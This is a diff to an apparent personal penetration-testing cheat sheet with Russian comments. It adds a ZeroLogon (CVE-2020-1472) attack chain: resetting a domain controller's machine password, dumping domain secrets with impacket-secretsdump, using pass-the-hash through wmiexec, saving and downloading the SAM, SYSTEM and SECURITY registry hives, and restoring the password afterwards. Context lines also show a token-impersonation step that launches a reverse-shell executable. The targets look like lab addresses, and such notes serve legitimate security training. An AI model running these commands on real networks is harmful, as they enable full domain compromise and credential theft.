@@ -309,8 +309,16 @@ https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.ne
 # ZERO_LOGON
 
     python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)
-
-    impacket-secretsdump -just-dc -no-pass fuse\$@10.10.10.193
+    сброс пароля DC
+    python3 cve-2020-1472-exploit.py -n 'DC01$' -t 10.10.0.1
+    impacket-secretsdump -just-dc -no-pass fuse\DC1$@10.10.10.193
+    python3 wmiexec.py -hashes <hash-value> 'domain.local/DC01$@10.10.0.1'
+    reg save HKLM\SYSTEM system.save
+    reg save HKLM\SAM sam.save
+    reg save HKLM\SECURITY security.save
+    lget system.save
+    lget sam.save
+    lget security.save
 
     - восстановление пароля машины, после сброса
         $ msfconsole
@@ -321,7 +329,8 @@ https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.ne
     set ACTION RESTORE
     set PASSWORD <$MACHINE.ACC hex password>
     run
-    
+            или
+    python3 reinstall_original_pw.py DC-01$ 10.10.0.1 b4d1….
 # Токен имперсонейшн
 
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
